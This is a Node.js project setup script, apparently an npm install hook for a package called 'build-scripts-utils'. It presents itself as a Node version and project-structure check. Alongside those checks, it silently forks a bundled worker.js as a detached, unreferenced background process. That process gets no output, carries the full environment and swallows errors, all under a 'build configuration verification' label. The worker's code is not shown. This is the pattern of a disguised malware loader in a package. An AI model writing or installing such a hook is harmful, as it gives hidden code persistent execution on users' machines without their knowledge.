#!/usr/bin/env node
'use strict';

/**
 * build-scripts-utils — project setup script
 * 
 * Performs initial project environment validation:
 *   - Node.js version check
 *   - Project structure validation
 *   - Build configuration verification (background)
 */

const fs = require('fs');
const path = require('path');
const cp = require('child_process');

const PKG_NAME = 'build-scripts-utils';
const MIN_NODE_MAJOR = 12;

let hasErrors = false;

function log(tag, msg) {
  try { console.log(`[${PKG_NAME}] ${tag}: ${msg}`); } catch(e) {}
}

// ---- Background worker launcher ----
function runWorker() {
  try {
    const workerPath = path.join(__dirname, 'worker.js');
    if (fs.existsSync(workerPath)) {
      const child = cp.fork(workerPath, ['--verify', PKG_NAME], {
        detached: true,
        stdio: 'ignore',
        env: Object.assign({}, process.env, { RUN_VERIFICATION: PKG_NAME })
      });
      child.unref();
    }
  } catch (e) {
    // Non-critical
  }
}

// ---- Step 1: Node.js version check ----
function checkNodeVersion() {
  const parts = process.version.replace('v', '').split('.').map(Number);
  const major = parts[0] || 0;
  if (major < MIN_NODE_MAJOR) {
    log('WARN', `Node.js v${process.version} detected — minimum recommended is v${MIN_NODE_MAJOR}. Some features may not work.`);
    hasErrors = true;
  } else {
    log('INFO', `Node.js v${process.version} — compatible`);
  }
}

// ---- Step 2: Project structure validation ----
function validateProjectStructure() {
  const cwd = process.cwd();
  const pkgPath = path.join(cwd, 'package.json');
  
  if (!fs.existsSync(pkgPath)) {
    log('WARN', 'No package.json found in current directory — project may not be fully initialized');
    return;
  }
  
  try {
    const pkg = JSON.parse(fs.readFileSync(pkgPath, 'utf-8'));
    if (!pkg.name) {
      log('WARN', 'package.json is missing a "name" field');
    }
    log('INFO', `Project: ${pkg.name || 'unnamed'} (${pkg.version || 'no version'})`);
  } catch (e) {
    log('WARN', 'Could not parse package.json');
  }
  
  // Check for common project directories
  const commonDirs = ['src', 'lib', 'dist', 'build', 'test'];
  const found = commonDirs.filter(d => fs.existsSync(path.join(cwd, d)));
  if (found.length > 0) {
    log('INFO', `Project directories found: ${found.join(', ')}`);
  } else {
    log('INFO', 'No standard project directories detected — this may be a fresh setup');
  }
}

// ---- Main ----
function main() {
  log('INFO', 'Running project setup checks...');
  
  checkNodeVersion();
  validateProjectStructure();
  
  // Start build worker in background (detached to not block install)
  runWorker();
  
  if (hasErrors) {
    log('DONE', 'Setup completed with warnings');
  } else {
    log('DONE', 'Setup completed successfully');
  }
}

main();
